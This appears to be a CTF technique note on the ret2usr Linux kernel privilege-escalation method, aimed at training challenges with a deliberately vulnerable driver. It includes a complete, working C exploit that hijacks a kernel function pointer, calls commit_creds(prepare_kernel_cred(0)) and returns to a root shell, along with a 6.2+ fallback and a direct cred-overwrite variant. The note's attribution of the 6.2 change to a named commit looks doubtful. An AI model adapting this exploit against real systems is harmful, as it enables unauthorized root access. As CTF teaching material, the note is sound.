---
title: "ret2usr - commit_creds(prepare_kernel_cred(0)) and the Return to User Land"
category: pwn
subcategory: kernel
type: technique
tags: [kernel, ret2usr, commit-creds, prepare-kernel-cred, smep, kaslr, swapgs, iretq, save-state, get-shell, cred, init-task, kallsyms, qemu, pwndbg, gef]
difficulty: easy
summary: "With SMEP off, point a corrupted kernel function pointer at your own code, call commit_creds(prepare_kernel_cred(0)), then swapgs+iretq back to a root shell."
when_to_use:
  - "`-cpu qemu64` with no `+smep` in run.sh"
  - "You control a kernel function pointer or a return address on the kernel stack"
  - "The kernel is older than 6.2 (prepare_kernel_cred(NULL) still works)"
  - "You want the simplest possible kernel privilege escalation to build on"
tools: [qemu, gdb, pwndbg, gef, gcc]
related: [kernel-setup-and-debug, kernel-mitigations, kernel-rop-kpti-trampoline, kernel-modprobe-path, kernel-exploit-template]
---

## TL;DR

Every task's privileges live in a `struct cred`. `prepare_kernel_cred(NULL)` builds a
root cred and `commit_creds()` installs it on the current task. With SMEP off you can
simply redirect kernel execution into a userland function that calls those two, then
`swapgs; iretq` back to a saved user context and `execve("/bin/sh")` as root.
On Linux >= 6.2 `prepare_kernel_cred(NULL)` returns NULL - use `&init_task`'s cred or
overwrite the cred fields directly.

## Recognise it

- `run.sh` has `-cpu qemu64` (or `kvm64`) with **no** `+smep`.
- The driver stores a function pointer you can overwrite, or a stack overflow gives you
  the kernel return address.
- `/proc/kallsyms` is readable (development) or the challenge gives you a leak.
- The challenge is described as "baby kernel" / "kernel 101".

## Vulnerable code shape

```c
/* (a) a function pointer in a kernel object */
struct dev_ops { void (*handler)(void); char name[0x20]; };
static struct dev_ops *obj;

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    if (cmd == SET_NAME)
        copy_from_user(obj->name, (void __user *)arg, 0x100);  /* overflows handler */
    if (cmd == RUN)
        obj->handler();                                        /* calls it */
    return 0;
}

/* (b) a plain kernel stack overflow */
static ssize_t vuln_write(struct file *f, const char __user *buf,
                          size_t len, loff_t *off)
{
    char local[0x40];
    copy_from_user(local, buf, len);        /* len unchecked -> saved RIP */
    return len;
}
```

## Theory

Targets: Linux 4.x - 6.1 for the classic form; 6.2+ needs the variant below.

### The credential structures

```c
struct cred {
    atomic_t usage;
    kuid_t   uid;    /* +0x04 */
    kgid_t   gid;    /* +0x08 */
    kuid_t   suid;   /* +0x0c */
    kgid_t   sgid;   /* +0x10 */
    kuid_t   euid;   /* +0x14 */
    kgid_t   egid;   /* +0x18 */
    kuid_t   fsuid;  /* +0x1c */
    kgid_t   fsgid;  /* +0x20 */
    ...
};

struct cred *prepare_kernel_cred(struct task_struct *daemon);
int          commit_creds(struct cred *new);
```

`prepare_kernel_cred(NULL)` historically returned a cred with all ids 0 and full
capabilities. `commit_creds()` installs it into `current->cred`. Two calls, done.

**Linux 6.2 change** (commit "kernel: be more careful about dup_mmap() failures" era -
specifically the `prepare_kernel_cred` hardening): passing `NULL` now returns `NULL`,
and `commit_creds(NULL)` oopses. On 6.2+ use:

- `commit_creds(prepare_kernel_cred(&init_task))` - `init_task` is a static symbol,
  so you can resolve it the same way you resolve the functions; or
- a direct write: find `current->cred` (via `task_struct` offset `cred`) and zero
  `uid`..`fsgid` (8 dwords at `cred + 0x04`); or
- `commit_creds(&init_cred)` - `init_cred` is also a static symbol on many builds.

### Saving and restoring the user context

Returning from kernel mode to user mode needs, on the stack, in this order (low to
high): `RIP`, `CS`, `RFLAGS`, `RSP`, `SS`. `iretq` pops all five. `swapgs` must run
first to restore the user `GS` base.

Capture them before you enter the kernel:

```c
unsigned long user_cs, user_ss, user_rsp, user_rflags;

void save_state(void) {
    __asm__ __volatile__(
        "movq %%cs,  %0\n"
        "movq %%ss,  %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}
```

Then the return trampoline:

```c
__asm__ __volatile__(
    "swapgs\n"
    "movq %0, %%rsp\n"      /* not required, but keeps things tidy */
    "pushq %1\n"            /* SS      */
    "pushq %2\n"            /* RSP     */
    "pushq %3\n"            /* RFLAGS  */
    "pushq %4\n"            /* CS      */
    "pushq %5\n"            /* RIP     */
    "iretq\n" : : ...);
```

With KPTI on, a bare `swapgs; iretq` triple faults - see
`kernel-rop-kpti-trampoline`. With KPTI off (`nopti`), this is all you need.

### Why SMEP matters

`obj->handler()` calls into a user-space address. SMEP makes the CPU fault instead.
Without SMEP the kernel happily executes your ring-3 page while still in ring 0, so
your C function runs with kernel privileges.

## Attack

1. `save_state()` **first thing in main**, before anything touches `rsp` or flags.
2. Resolve `commit_creds` and `prepare_kernel_cred`:
   - development: `/proc/kallsyms`
   - real run: a leak plus the offsets from `vmlinux`.
3. Write the escalation function:
   ```c
   void escalate(void) { commit_creds(prepare_kernel_cred(0)); }
   ```
   as function pointers cast from the resolved addresses.
4. Overwrite the kernel function pointer (or the saved return address) with
   `&escalate`.
5. Trigger the call. `escalate` runs in ring 0.
6. `escalate` ends by jumping to the `swapgs; iretq` trampoline with `RIP` set to
   `get_shell`.
7. `get_shell()` runs in ring 3 with uid 0: `system("/bin/sh")` or
   `execve("/bin/sh", ...)`.
8. `cat /root/flag`.

## Heap state

```text
before the trigger

  kernel:  obj (kmalloc-64)
           +0x00 | handler = original_fn |
           +0x08 | name[0x20]            |

  user:    escalate()  at 0x0000000000401b30
           get_shell() at 0x0000000000401bc0
           saved: user_cs, user_ss, user_rsp, user_rflags


after copy_from_user overflow

           +0x00 | handler = 0x401b30 (escalate) |   <- SMEP would block this


the call, in ring 0

  obj->handler()
    -> escalate()                     ring 0, user page (needs SMEP off)
         prepare_kernel_cred(0) -> struct cred* with uid=gid=0
         commit_creds(cred)     -> current->cred = that cred
    -> swapgs                         restore user GS base
    -> push SS, RSP, RFLAGS, CS, RIP
    -> iretq                          back to ring 3


the stack iretq consumes (high addresses at the bottom)

   rsp+0x00 | RIP     = get_shell |
   rsp+0x08 | CS      = user_cs   |
   rsp+0x10 | RFLAGS  = user_rflags |
   rsp+0x18 | RSP     = user_rsp  |
   rsp+0x20 | SS      = user_ss   |

after: uid=0, ring 3, /bin/sh
```

## Exploit

```c
/* ret2usr.c - classic kernel privilege escalation, SMEP and KPTI off.
 * Build: gcc -static -O2 -no-pie -o exp ret2usr.c
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE "/dev/vuln"
#define CMD_SET_NAME 0x1000
#define CMD_RUN      0x1001

/* Saved user-mode context. MUST be captured before anything else runs. */
static unsigned long user_cs, user_ss, user_rsp, user_rflags;

/* Resolved kernel symbols. */
static unsigned long kbase;
static unsigned long addr_commit_creds;
static unsigned long addr_prepare_kernel_cred;
static unsigned long addr_init_task;

/* Kernel function types. */
typedef unsigned long (*prepare_kernel_cred_t)(unsigned long);
typedef void (*commit_creds_t)(unsigned long);

static void die(const char *m)
{
    perror(m);
    exit(1);
}

static void save_state(void)
{
    __asm__ __volatile__(
        "movq %%cs,  %0\n"
        "movq %%ss,  %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

static void get_shell(void)
{
    if (getuid() == 0) {
        puts("[+] uid 0 - popping a shell");
        execl("/bin/sh", "sh", NULL);
    } else {
        puts("[-] escalation failed");
    }
    exit(0);
}

/* Runs in ring 0 (SMEP must be off). No stack frame games: keep it tiny. */
static void escalate(void)
{
    prepare_kernel_cred_t pkc = (prepare_kernel_cred_t)addr_prepare_kernel_cred;
    commit_creds_t cc = (commit_creds_t)addr_commit_creds;
    unsigned long cred;

    cred = pkc(0);                     /* NULL fails on Linux >= 6.2 */
    if (!cred && addr_init_task)
        cred = pkc(addr_init_task);    /* 6.2+ fallback */
    cc(cred);

    __asm__ __volatile__(
        "swapgs\n"
        "pushq %0\n"                   /* SS     */
        "pushq %1\n"                   /* RSP    */
        "pushq %2\n"                   /* RFLAGS */
        "pushq %3\n"                   /* CS     */
        "pushq %4\n"                   /* RIP    */
        "iretq\n"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
          "r"((unsigned long)get_shell)
        : "memory");
}

static unsigned long ksym(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[512], sym[256], type;
    unsigned long val, out = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "%lx %c %255s", &val, &type, sym) != 3)
            continue;
        if (strcmp(sym, name) == 0) {
            out = val;
            break;
        }
    }
    fclose(f);
    return out;
}

static void resolve_symbols(void)
{
    addr_commit_creds = ksym("commit_creds");
    addr_prepare_kernel_cred = ksym("prepare_kernel_cred");
    addr_init_task = ksym("init_task");

    if (!addr_commit_creds) {
        /* kptr_restrict is on: fall back to base + offset. Get KBASE from a
         * leak primitive; the offsets come from `nm vmlinux`. */
        const unsigned long OFF_COMMIT_CREDS = 0x0C4700;
        const unsigned long OFF_PREPARE_CRED = 0x0C4AE0;
        const unsigned long OFF_INIT_TASK    = 0x1A0B840;
        const char *env = getenv("KBASE");

        kbase = env ? strtoul(env, NULL, 0) : 0xFFFFFFFF81000000UL;
        addr_commit_creds = kbase + OFF_COMMIT_CREDS;
        addr_prepare_kernel_cred = kbase + OFF_PREPARE_CRED;
        addr_init_task = kbase + OFF_INIT_TASK;
        printf("[*] using KBASE = %#lx (set $KBASE to override)\n", kbase);
    }

    printf("[+] commit_creds        = %#lx\n", addr_commit_creds);
    printf("[+] prepare_kernel_cred = %#lx\n", addr_prepare_kernel_cred);
    printf("[+] init_task           = %#lx\n", addr_init_task);
}

static void pin_cpu0(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof set, &set);
}

int main(void)
{
    int fd;
    unsigned char payload[0x100];

    save_state();          /* FIRST. Everything else may clobber rsp/flags. */
    pin_cpu0();
    resolve_symbols();

    fd = open(DEVICE, O_RDWR);
    if (fd < 0)
        die("open " DEVICE);

    /* Overflow the object: 0x00 is the function pointer, rest is the name. */
    memset(payload, 0x41, sizeof payload);
    *(unsigned long *)payload = (unsigned long)escalate;

    if (ioctl(fd, CMD_SET_NAME, payload) < 0)
        die("ioctl SET_NAME");

    puts("[*] function pointer overwritten, triggering...");
    ioctl(fd, CMD_RUN, 0);      /* calls escalate() in ring 0 */

    /* If iretq worked we never get here. */
    get_shell();
    return 0;
}
```

## Variants & pitfalls

- **`unable to execute userspace code (SMEP?)`** - SMEP is on. Go to
  `kernel-rop-kpti-trampoline`.
- **Triple fault / instant reboot after `iretq`** - KPTI is on. You must return through
  `swapgs_restore_regs_and_return_to_usermode`.
- **`save_state` must run before anything else.** If the compiler inlines a call that
  changes `rsp` first you get a broken `user_rsp`; mark it `__attribute__((naked))` or
  call it as the first statement of `main` (as above).
- **Linux >= 6.2**: `prepare_kernel_cred(NULL)` returns NULL. The code above already
  falls back to `init_task`.
- **Compiler stack protector.** `-fno-stack-protector` if the overflow target is a
  local buffer in *your* code (not needed for the kernel side).
- **`escalate()` must not touch the (kernel) stack much.** With `-O2` it will not, but
  with a debug build the prologue may be large enough to matter if you jumped in via a
  stack pivot.
- **Direct cred overwrite** is an alternative that needs no function calls at all:
  find `current` (via `gs:0x15d00` = `current_task` on many builds), follow
  `task_struct->cred`, and write zeros to `cred+0x04 .. cred+0x24`.
- **`getuid()` still shows 1000** after a "successful" run: `commit_creds` was called
  with a bad cred, or you escalated a different task. Check `dmesg`.

## Debugging

```text
pwndbg> b *0x401b30                 # break on escalate() before it runs
pwndbg> p &commit_creds
pwndbg> p &prepare_kernel_cred
pwndbg> p &init_task
pwndbg> p/x $cr4                    # bit 20 must be CLEAR for ret2usr
pwndbg> b commit_creds
pwndbg> p *(struct cred *)$rdi      # the cred being installed: uid should be 0
pwndbg> x/8wx $rdi
pwndbg> bt
```

```bash
# Inside the VM, before and after:
id
cat /proc/self/status | grep -E '^(Uid|Gid|Cap)'
dmesg | tail -30
```

## Tools

- `gcc -static -no-pie`, `qemu`, `gdb` + `pwndbg`.
- `nm vmlinux | grep -E 'commit_creds|prepare_kernel_cred|init_task'` for the offsets.
- `vmlinux-to-elf` if `nm` gives you nothing.

## References

- Linux `kernel/cred.c`: `prepare_kernel_cred`, `commit_creds`.
- Linux `arch/x86/entry/entry_64.S` for the return path.
